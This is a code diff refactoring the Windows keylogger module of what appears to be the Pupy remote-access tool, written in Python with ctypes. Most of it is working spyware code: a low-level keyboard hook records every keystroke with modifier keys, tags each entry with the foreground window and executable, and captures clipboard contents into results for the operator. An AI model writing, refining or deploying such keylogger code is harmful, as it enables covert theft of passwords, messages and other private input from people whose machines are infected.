@@ -12,121 +12,54 @@
 #
 # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
-#coding: utf-8
-import sys
 
-from ctypes import *
-from ctypes.wintypes import *
-
-import threading
-import time
 import datetime
-import platform
-import os
+import string
+
+from hookfuncs import *
+
 import pupy
 
-# Base windows types
-#LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
-#WPARAM  = c_uint
-#LPARAM  = c_long
-ULONG_PTR = WPARAM
-LRESULT = LPARAM
-LPMSG = POINTER(MSG)
-
-HANDLE  = c_void_p
-HHOOK   = HANDLE
-HKL     = HANDLE
-ULONG_PTR = WPARAM
-
-HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
-user32 = windll.user32
-kernel32 = windll.kernel32
-psapi = windll.psapi
-
-# Base constans
-# https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
-WM_KEYDOWN      = 0x0100
-WM_KEYUP        = 0x0101
-WM_SYSKEYDOWN   = 0x0104
-WM_SYSKEYUP     = 0x0105
-WH_KEYBOARD_LL  = 13
-VK_TAB          = 0x09 # TAB key
-VK_CAPITAL      = 0x14 # CAPITAL key
-VK_SHIFT        = 0x10 # SHIFT key
-VK_CONTROL      = 0x11 # CTRL key
-VK_MENU         = 0x12 # ALT key
-VK_LMENU        = 0xA4 # ALT key
-VK_RMENU        = 0xA5 # ALT+GR key
-VK_RETURN       = 0x0D # ENTER key
-VK_ESCAPE       = 0x1B
+UNPRINTABLE = {
+    0x09: 'TAB',
+    0x0D: 'RET',
+    0x1B: 'ESC',
+    0x08: 'BKSC',
+    0x21: 'PGUP',
+    0x22: 'PGDN',
+    0x23: 'END',
+    0x24: 'HOME',
+    0x25: 'LFT',
+    0x26: 'UP',
+    0x27: 'RGHT',
+    0x28: 'DWN',
+    0x2D: 'INS',
+    0x2E: 'DEL',
+    0x5B: 'LWIN',
+    0x5C: 'RWIN',
+    0x5D: 'APPS',
+    0x70: 'F1',
+    0x71: 'F2',
+    0x72: 'F3',
+    0x73: 'F4',
+    0x74: 'F5',
+    0x75: 'F6',
+    0x76: 'F7',
+    0x77: 'F8',
+    0x78: 'F9',
+    0x79: 'F10',
+    0x7A: 'F11',
+    0x7B: 'F12'
+}
 
 #some windows function defines :
-
-GetModuleHandleW = kernel32.GetModuleHandleW
-GetModuleHandleW.restype = HMODULE
-GetModuleHandleW.argtypes = [LPCWSTR]
-
-SetWindowsHookEx = user32.SetWindowsHookExW
-SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
-SetWindowsHookEx.restype = HHOOK
-
-UnhookWindowsHookEx = user32.UnhookWindowsHookEx
-CallNextHookEx      = user32.CallNextHookEx
-GetMessageW         = user32.GetMessageW
-GetKeyboardState    = user32.GetKeyboardState
-GetKeyboardLayout   = user32.GetKeyboardLayout
-ToUnicodeEx         = user32.ToUnicodeEx
-ToAsciiEx           = user32.ToAsciiEx
-
-SetTimer            = user32.SetTimer
-SetTimer.restype    = ULONG_PTR
-SetTimer.argtypes   = (HWND, ULONG_PTR, UINT, c_void_p)
-
-KillTimer           = user32.KillTimer
-KillTimer.restype   = BOOL
-KillTimer.argtypes  = (HWND, ULONG_PTR)
-
-GetKeyState         = user32.GetKeyState
-
-GetWindowThreadProcessId = user32.GetWindowThreadProcessId
-GetWindowThreadProcessId.restype = DWORD
-GetWindowThreadProcessId.argtypes = (HWND, POINTER(DWORD))
-
-GetForegroundWindow = user32.GetForegroundWindow
-
-CallNextHookEx.restype = LRESULT
-CallNextHookEx.argtypes = (HHOOK,  # _In_opt_ hhk
-                                    c_int,  # _In_     nCode
-                                    WPARAM, # _In_     wParam
-                                    LPARAM) # _In_     lParam
-
-GetMessageW.argtypes = (LPMSG, # _Out_    lpMsg
-                                HWND,  # _In_opt_ hWnd
-                                UINT,  # _In_     wMsgFilterMin
-                                UINT)  # _In_     wMsgFilterMax
-
-# Macros
-LOWORD = lambda x: x & 0xffff
-
-# Base structures
-class KBDLLHOOKSTRUCT(Structure):
-    _fields_ = [
-        ('vkCode',      DWORD),
-        ('scanCode',    DWORD),
-        ('flags',       DWORD),
-        ('time',        DWORD),
-        ('dwExtraInfo', ULONG_PTR)
-    ]
-
-# Function prototypes
-LOWLEVELKEYBOARDPROC = CFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
 
 def keylogger_start():
     if pupy.manager.active(KeyLogger):
         return False
 
     try:
-        keyLogger = pupy.manager.create(KeyLogger)
+        pupy.manager.create(KeyLogger)
     except:
         return False
 
@@ -139,10 +72,14 @@ def keylogger_dump():
 
 def keylogger_stop():
     keylogger = pupy.manager.get(KeyLogger)
-    dump = ''
     if keylogger:
         pupy.manager.stop(KeyLogger)
         return keylogger.results
+
+def is_pressed(*keys):
+    return any(
+        GetKeyState(x) & 0x8000 for x in keys
+    )
 
 class KeyLogger(pupy.Task):
     results_type = unicode
@@ -150,112 +87,156 @@ class KeyLogger(pupy.Task):
     def __init__(self, *args, **kwargs):
         super(KeyLogger, self).__init__(*args, **kwargs)
         self.hooked = None
-        self.pointer = None
         self.last_windows = None
-        self.last_clipboard = ""
+        self.last_clipboard = ''
+        self.hook_proc_ptr = HOOKPROC(self.hook_proc)
 
     def append(self, k):
         if type(k) == unicode:
             super(KeyLogger, self).append(k)
         else:
-            try:
-                super(KeyLogger, self).append(k.decode('utf-8'))
-            except:
-                # super(KeyLogger, self).append('{H:'+k.encode('hex')+'}')
-                pass
+            super(KeyLogger, self).append(k.decode('utf-8'))
 
     def task(self):
-        self.install_hook()
-        msg = MSG()
-        timer = SetTimer(0, 0, 1000, 0)
-        while self.active:
-            GetMessageW(byref(msg), 0, 0, 0)
-        KillTimer(0, timer)
-        self.uninstall_hook()
+        if self.hooked:
+            raise ValueError('Task already active')
+
+        try:
+            self.install_hook()
+        except:
+            self.stop()
+            return
+
+        timer = None
+
+        try:
+            timer = SetTimer(0, 0, 1000, 0)
+
+            msg = MSG()
+            msgptr = byref(msg)
+
+            while self.active:
+                try:
+                    GetMessageW(msgptr, None, 0, 0)
+                except Exception, e:
+                    raise ValueError('Shit: {} / {} / {} / {}'.format(msg, msgptr, GetMessageW, e))
+
+        finally:
+            if timer:
+                KillTimer(0, timer)
+
+            self.uninstall_hook()
 
     def install_hook(self):
-        self.pointer = HOOKPROC(self.hook_proc)
+        if self.hooked:
+            raise ValueError('Task already active')
+
         modhwd = GetModuleHandleW(None)
-        self.hooked = SetWindowsHookEx(WH_KEYBOARD_LL, self.pointer, modhwd, 0)
+
+        self.hooked = SetWindowsHookEx(
+            WH_KEYBOARD_LL, self.hook_proc_ptr, modhwd, 0)
+
         if not self.hooked:
             raise WinError()
-        return True
 
     def uninstall_hook(self):
         if self.hooked is None:
             return
-        UnhookWindowsHookEx(self.hooked)
-        self.hooked = None
+
+        try:
+            if not UnhookWindowsHookEx(self.hooked):
+                raise WinError()
+
+        finally:
+            self.hooked = None
 
     def hook_proc(self, nCode, wParam, lParam):
-        # The keylogger callback
-        if LOWORD(wParam) != WM_KEYUP and LOWORD(wParam) != WM_SYSKEYUP:
+        try:
+            self._hook_proc(nCode, wParam, lParam)
+        except:
+            import traceback
+            traceback.print_exc()
+            raise
+
+        finally:
             return CallNextHookEx(self.hooked, nCode, wParam, lParam)
+
+    def _hook_proc(self, nCode, wParam, lParam):
+        # The keylogger callback
+        if LOWORD(wParam) not in (WM_KEYUP, WM_SYSKEYUP):
+            return
 
         keyState = (BYTE * 256)()
         buff = (WCHAR * 256)()
         kbdllhookstruct = KBDLLHOOKSTRUCT.from_address(lParam)
-        hooked_key = ""
-        specialKey = ""
-        # index of the keystate : http://wiki.cheatengine.org/index.php?title=Virtual-Key_Code
-        # ESCAPE
-        if GetKeyState(VK_ESCAPE) & 0x8000:
-            specialKey = '[ESCAPE]'
 
-        # SHIFT
-        if GetKeyState(VK_SHIFT) & 0x8000:
-            keyState[16] = 0x80;
-
-        # CTRL
-        if GetKeyState(VK_CONTROL) & 0x8000:
-            keyState[17] = 0x80;
-
-        # ALT
-        if GetKeyState(VK_MENU) & 0x8000:
-            keyState[18] = 0x80;
-
-        if kbdllhookstruct.vkCode == VK_TAB:
-            specialKey = '[TAB]'
-
-        elif kbdllhookstruct.vkCode == VK_RETURN:
-            specialKey = '[RETURN]'
+        key = ''
+        modifiers = []
 
         pid = DWORD()
         tid = GetWindowThreadProcessId(GetForegroundWindow(), byref(pid))
         hKl = GetKeyboardLayout(tid)
-        GetKeyboardState(byref(keyState))
 
-        #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
-        r = ToUnicodeEx(
-            kbdllhookstruct.vkCode,
-            kbdllhookstruct.scanCode,
-            byref(keyState),
-            byref(buff),
-            256,
-            0,
-            hKl
-        )
+        if not GetKeyboardState(byref(keyState)):
+            return
 
-        if r == 0:
-            r = ToAsciiEx(
+        if is_pressed(VK_MENU):
+            keyState[VK_MENU] = 0x80
+            modifiers.append('ALT')
+
+        if is_pressed(VK_CONTROL):
+            keyState[VK_MENU] = 0x80
+            modifiers.append('CTRL')
+
+        if is_pressed(VK_LWIN, VK_RWIN):
+            modifiers.append('WIN')
+
+        if is_pressed(VK_SHIFT):
+            keyState[VK_SHIFT] = 0x80
+            if modifiers:
+                modifiers.append('SHIFT')
+
+        if kbdllhookstruct.vkCode in UNPRINTABLE:
+            if not ( kbdllhookstruct.vkCode in (VK_LWIN, VK_RWIN) and 'WIN' in modifiers ):
+                key = UNPRINTABLE[kbdllhookstruct.vkCode]
+                if not modifiers:
+                    key = '[' + key + ']'
+
+        else:
+            #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
+            r = ToUnicodeEx(
                 kbdllhookstruct.vkCode,
                 kbdllhookstruct.scanCode,
                 byref(keyState),
                 byref(buff),
+                256,
                 0,
-                0
+                hKl
             )
 
-        if r==0: #nothing written to the buffer
-            try:
-                hooked_key = chr(kbdllhookstruct.vkCode)
-            except:
-                hooked_key = '0x%s'%kbdllhookstruct.vkCode
-        else:
-            hooked_key = buff.value
+            if r == 0:
+                r = ToAsciiEx(
+                    kbdllhookstruct.vkCode,
+                    kbdllhookstruct.scanCode,
+                    byref(keyState),
+                    byref(buff),
+                    0,
+                    0
+                )
 
-        if specialKey:
-            hooked_key = specialKey
+            if r == 0: #nothing written to the buffer
+                key = chr(kbdllhookstruct.vkCode)
+                if key not in string.printable:
+                    key = '{:02X}'.format(
+                        kbdllhookstruct.vkCode)
+
+            else:
+                key = buff.value
+
+        if modifiers and key:
+            hooked_key = '{' + ('+'.join(modifiers)) + '+' + key + '}'
+        else:
+            hooked_key = key
 
         exe, win_title = 'unknown', 'unknown'
         try:
@@ -273,7 +254,7 @@ class KeyLogger(pupy.Task):
         paste=''
 
         try:
-            paste = winGetClipboard()
+            paste = get_clipboard()
         except Exception:
             pass
 
@@ -282,35 +263,7 @@ class KeyLogger(pupy.Task):
                 self.append(u'\n<clipboard>{}</clipboard>\n'.format(paste.strip()))
             except:
                 self.append(u'\n<clipboard>{}</clipboard>\n'.format(repr(paste)[2:-1]))
+
             self.last_clipboard = paste
 
         self.append(hooked_key)
-        return CallNextHookEx(self.hooked, nCode, wParam, lParam)
-
-#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
-def get_current_process():
-    hwnd = GetForegroundWindow()
-
-    pid = c_ulong(0)
-    GetWindowThreadProcessId(hwnd, byref(pid))
-
-    #process_id = "%d" % pid.value
-
-    executable = create_unicode_buffer('\x00', 512)
-    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
-    psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
-
-    window_title = create_unicode_buffer('\x00', 512)
-    length = user32.GetWindowTextW(hwnd, byref(window_title),512)
-
-    kernel32.CloseHandle(hwnd)
-    kernel32.CloseHandle(h_process)
-    return executable.value, window_title.value
-
-##http://nullege.com/codes/show/src%40t%40h%40thbattle-HEAD%40src%40utils%40pyperclip.py/48/ctypes.windll.user32.OpenClipboard/python
-def winGetClipboard(): #link above is multiplatform, this can easily expand if keylogger becomes multiplatform
-    windll.user32.OpenClipboard(0)
-    pcontents = windll.user32.GetClipboardData(13) # CF_UNICODETEXT
-    data = c_wchar_p(pcontents).value
-    windll.user32.CloseClipboard()
-    return data
